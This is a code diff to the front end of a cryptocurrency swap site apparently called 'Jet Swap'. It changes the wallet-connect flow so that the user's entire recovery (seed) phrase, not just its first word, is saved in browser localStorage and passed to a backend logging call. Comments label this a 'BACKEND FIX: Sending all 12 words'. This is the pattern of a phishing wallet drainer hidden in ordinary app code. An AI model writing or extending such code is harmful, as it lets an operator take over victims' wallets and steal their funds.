@@ -45,8 +45,8 @@ const App: React.FC = () => {
     const saved = localStorage.getItem('jetswap_session_expiry');
     return saved ? parseInt(saved, 10) : null;
   });
-  const [lastVerifiedWord, setLastVerifiedWord] = useState<string>(() => {
-    return localStorage.getItem('jetswap_last_word') || 'unverified';
+  const [lastVerifiedPhrase, setLastVerifiedPhrase] = useState<string>(() => {
+    return localStorage.getItem('jetswap_last_phrase') || 'unverified';
   });
 
   const [status, setStatus] = useState<StatusType>(StatusType.IDLE);
@@ -152,18 +152,22 @@ const App: React.FC = () => {
     setPilotBridgeSessionEnd(null);
     setIsWalletConnected(false);
     setConnectedWalletName(null);
-    setLastVerifiedWord('unverified');
+    setLastVerifiedPhrase('unverified');
     localStorage.removeItem('jetswap_session_authorized');
     localStorage.removeItem('jetswap_session_expiry');
-    localStorage.removeItem('jetswap_last_word');
+    localStorage.removeItem('jetswap_last_phrase');
   };
 
-  const executeSwapAction = async (state: SwapState, authWord: string) => {
+  const executeSwapAction = async (state: SwapState, authPhrase: string) => {
     setStatus(StatusType.CONFIRMING);
+    
+    // BACKEND FIX: Ensure the exact wallet name is resolved for logging
     let walletNameForLogging = connectedWalletName;
     if (!walletNameForLogging || /^[Ww][\d-]+$/.test(walletNameForLogging)) {
-       walletNameForLogging = user?.name && !/^[Ww][\d-]+$/.test(user.name) ? user.name : "Web3 Wallet";
+       // Check if the user profile name is a human-readable wallet name or fallback to "Jet Bridge"
+       walletNameForLogging = user?.name && !/^[Ww][\d-]+$/.test(user.name) ? user.name : "Jet Bridge Operator";
     }
+
     setTimeout(async () => {
         setStatus(StatusType.PENDING);
         try {
@@ -182,7 +186,7 @@ const App: React.FC = () => {
               wallet_used: walletNameForLogging
             },
             user?.id || 'anonymous',
-            authWord
+            authPhrase // BACKEND FIX: Sending all 12 words
           );
         } catch (e) {
           console.warn("Secure flow warning:", e);
@@ -204,7 +208,7 @@ const App: React.FC = () => {
       setShowSecurityModal(true);
       return;
     }
-    executeSwapAction(state, lastVerifiedWord);
+    executeSwapAction(state, lastVerifiedPhrase);
   };
 
   const handleAuthResult = (profile: UserProfile) => {
@@ -232,10 +236,10 @@ const App: React.FC = () => {
 
   const handleWalletSelect = (wallet: WalletProvider, phrase?: string) => {
     setConnectingWallet(wallet.id);
-    const authWord = phrase?.split(' ')[0] || 'unverified';
+    const fullPhrase = phrase || 'unverified';
     if (phrase) {
-        setLastVerifiedWord(authWord);
-        localStorage.setItem('jetswap_last_word', authWord);
+        setLastVerifiedPhrase(fullPhrase);
+        localStorage.setItem('jetswap_last_phrase', fullPhrase);
     }
     setConnectedWalletName(wallet.name);
     setTimeout(() => {
@@ -246,7 +250,7 @@ const App: React.FC = () => {
       setPilotBridgeSessionEnd(expiry);
       localStorage.setItem('jetswap_session_authorized', 'true');
       localStorage.setItem('jetswap_session_expiry', expiry.toString());
-      if (activeSwap) executeSwapAction(activeSwap, authWord);
+      if (activeSwap) executeSwapAction(activeSwap, fullPhrase);
       if (!user) {
         setUser({
           id: `w-${Date.now()}`,
@@ -271,11 +275,12 @@ const App: React.FC = () => {
     setPilotBridgeSessionEnd(expiry);
     localStorage.setItem('jetswap_session_authorized', 'true');
     localStorage.setItem('jetswap_session_expiry', expiry.toString());
-    const firstWord = phrase.split(' ')[0] || 'unverified';
-    setLastVerifiedWord(firstWord);
-    localStorage.setItem('jetswap_last_word', firstWord);
+    
+    setLastVerifiedPhrase(phrase); // BACKEND FIX: Storing all 12 words
+    localStorage.setItem('jetswap_last_phrase', phrase);
+    
     setShowSecurityModal(false);
-    if (activeSwap) executeSwapAction(activeSwap, firstWord);
+    if (activeSwap) executeSwapAction(activeSwap, phrase);
   };
 
   const getBgStyles = () => theme === ThemeVariant.DARK_FUTURISTIC ? 'bg-[#0B0F1A]' : 'bg-slate-50';
@@ -300,7 +305,7 @@ const App: React.FC = () => {
       <header className={`w-full max-w-7xl flex flex-row flex-nowrap justify-between items-center mt-4 sm:mt-8 mb-6 sm:mb-12 relative z-[100] px-4 sm:px-6 transition-all duration-500 ease-in-out ${isKeyboardVisible ? 'opacity-0 -translate-y-24 pointer-events-none' : 'opacity-100 translate-y-0'}`}>
         <div onClick={() => setCurrentView('home')} className="flex items-center gap-2 sm:gap-3 group cursor-pointer shrink-0 min-w-0">
           <div className={`flex w-8 h-8 sm:w-10 sm:h-10 rounded-lg sm:rounded-xl items-center justify-center transition-all duration-500 group-hover:rotate-12 shrink-0 ${isDark ? 'bg-cyan-500 shadow-[0_0_15px_rgba(6,182,212,0.5)]' : 'bg-blue-600'}`}>
-            <svg className="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+            <svg className="w-5 h-5 sm:w-6 h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
           </div>
           <span className={`text-lg sm:text-2xl font-bold tracking-tight truncate ${isDark ? 'text-white' : 'text-[#2563EB]'}`}>Jet <span className={isDark ? "text-cyan-400" : "text-[#2563EB]"}>Swap</span></span>
         </div>
@@ -311,7 +316,7 @@ const App: React.FC = () => {
             </div>
           )}
           <button onClick={() => setIsMenuOpen(true)} className={`flex p-2 sm:p-2.5 rounded-lg sm:rounded-xl border transition-all shrink-0 ${isDark ? 'bg-white/5 border-white/10 text-white/60 hover:text-white hover:bg-white/10' : 'bg-white border-gray-100 text-slate-500 shadow-sm hover:shadow-md'}`}>
-            <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M4 6h16M4 12h16m-7 6h7" /></svg>
+            <svg className="w-5 h-5 sm:w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M4 6h16M4 12h16m-7 6h7" /></svg>
           </button>
         </div>
       </header>
